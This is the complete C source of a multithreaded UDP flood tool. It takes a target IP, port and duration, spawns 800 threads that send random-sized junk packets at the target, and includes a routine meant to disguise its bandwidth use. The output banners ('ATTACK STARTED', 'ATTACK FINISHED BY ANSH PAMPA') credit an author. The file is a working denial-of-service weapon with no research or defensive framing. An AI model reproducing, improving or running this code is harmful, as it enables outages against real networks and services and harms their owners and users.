#define _GNU_SOURCE
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <pthread.h>
#include <arpa/inet.h>
#include <sched.h>
#include <fcntl.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <sys/prctl.h>
#include <time.h>

#define THREAD_COUNT 800
#define MAX_PACKET_SIZE 1600  

volatile int running = 1;

void encrypt_payload(char *buffer, int size) {
    for (int i = 0; i < size; i++) {
        buffer[i] ^= 0xFF;
    }
}

void generate_realtime_payload(char *buffer, int size) {
    for (int i = 0; i < size; i++) {
        buffer[i] = (rand() % 512) - 256; 
    }
    encrypt_payload(buffer, size);  
}

void disguise_bandwidth_usage() {
    int delay_factor = rand() % 100;
    if (delay_factor < 5) {  
        usleep(50000 + rand() % 200000); 
    }
}

typedef struct {
    char target_ip[16];
    int target_port;
    int attack_time;
} attack_params_t;

void *attack(void *arg) {
    attack_params_t *params = (attack_params_t *)arg;

    int sock;
    struct sockaddr_in target;
    char packet[MAX_PACKET_SIZE];

    memset(&target, 0, sizeof(target));
    target.sin_family = AF_INET;
    target.sin_port = htons(params->target_port);
    target.sin_addr.s_addr = inet_addr(params->target_ip);

    cpu_set_t cpuset;
    CPU_ZERO(&cpuset);
    CPU_SET(rand() % sysconf(_SC_NPROCESSORS_ONLN), &cpuset);
    sched_setaffinity(0, sizeof(cpu_set_t), &cpuset);

    time_t start_time = time(NULL);

    while (running && (time(NULL) - start_time < params->attack_time)) {
        int packet_size = 800 + rand() % (MAX_PACKET_SIZE - 800);
        generate_realtime_payload(packet, packet_size);

        sock = socket(AF_INET, SOCK_DGRAM, IPPROTO_UDP);
        if (sock < 0) continue;

        sendto(sock, packet, packet_size, 0, (struct sockaddr *)&target, sizeof(target));
        close(sock);

        disguise_bandwidth_usage();
    }

    return NULL;
}

int main(int argc, char *argv[]) {
    if (argc != 4) {
        printf("Usage: %s <IP> <PORT> <TIME>\n", argv[0]);
        return EXIT_FAILURE;
    }

    attack_params_t params;
    strncpy(params.target_ip, argv[1], 15);
    params.target_ip[15] = '\0';
    params.target_port = atoi(argv[2]);
    params.attack_time = atoi(argv[3]);

    srand(time(NULL));

    pthread_t threads[THREAD_COUNT];

    printf("ATTACK STARTED\n");

    for (int i = 0; i < THREAD_COUNT; i++) {
        pthread_create(&threads[i], NULL, attack, &params);
    }

    sleep(params.attack_time);
    running = 0;

    for (int i = 0; i < THREAD_COUNT; i++) {
        pthread_join(threads[i], NULL);
    }

    printf("ATTACK FINISHED BY ANSH PAMPA\n");
    return EXIT_SUCCESS;
}